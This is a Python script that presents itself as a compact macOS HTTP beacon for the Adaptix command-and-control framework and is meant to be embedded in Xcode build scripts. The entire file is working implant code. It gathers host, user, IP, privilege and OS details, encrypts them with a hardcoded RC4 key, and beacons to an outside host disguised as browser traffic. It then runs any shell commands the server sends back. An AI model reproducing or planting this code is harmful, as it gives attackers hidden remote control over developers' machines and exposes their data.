#!/usr/bin/env python3
"""Compact Adaptix HTTP Beacon for macOS - embeddable in Xcode build scripts"""
import os,sys,socket,struct,base64,random,time,subprocess,urllib.request,platform,getpass
C={"h":"192.168.36.226","p":8080,"u":"/api/update","k":bytes.fromhex("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"),"s":5}
def rc4(k,d):
    S=list(range(256));j=0
    for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
    i=j=0;r=bytearray(len(d))
    for x in range(len(d)):i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];r[x]=d[x]^S[(S[i]+S[j])%256]
    return bytes(r)
def pk32(v):return struct.pack(">I",v)
def pk16(v):return struct.pack(">H",v)
def pkb(d):return pk32(len(d))+d
def pks(s):return pkb(s.encode())
def gip():
    try:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
    except:return"127.0.0.1"
def info(aid):
    h=socket.gethostname();u=getpass.getuser();ip=gip()
    try:v=platform.mac_ver()[0].split('.');M,m=int(v[0]),int(v[1])
    except:M,m=10,15
    ipb=struct.unpack(">I",socket.inet_aton(ip))[0]
    return pk32(aid)+pk16(65001)+pk16(65001)+pk32(0)+pk16(os.getpid()&0xFFFF)+pk16(0)+bytes([1 if os.geteuid()==0 else 0,1 if platform.machine()=="arm64"else 0,1])+pk32(0)+pk32(M)+pk32(m)+bytes([0])+pk32(ipb)+pks(u)+pks("")+pks(h)+pks(sys.executable)
def run():
    aid=random.randint(0,0xFFFFFFFF);reg=False
    while True:
        try:
            if not reg:pkt=bytes([1])+pkb(info(aid));reg=True
            else:pkt=bytes([0])+pk32(aid)
            enc=rc4(C["k"],pkt)
            req=urllib.request.Request(f"http://{C['h']}:{C['p']}{C['u']}",data=enc,headers={"User-Agent":"Mozilla/5.0","X-Request-ID":base64.b64encode(pk32(aid)).decode(),"Content-Type":"application/octet-stream"},method="POST")
            try:
                with urllib.request.urlopen(req,timeout=30)as r:
                    if r.status==200:d=r.read()
                    if d:
                        dc=rc4(C["k"],d);i=0
                        while i<len(dc):
                            ct=dc[i];i+=1
                            if ct==0:break
                            sz=struct.unpack(">I",dc[i:i+4])[0];i+=4
                            cd=dc[i:i+sz];i+=sz
                            if ct==1:subprocess.run(cd.decode(),shell=True)
                            elif ct==4:sys.exit(0)
            except urllib.error.HTTPError as e:
                if e.code!=404:raise
        except Exception as e:pass
        time.sleep(C["s"]+random.random()*2)
if __name__=="__main__":run()
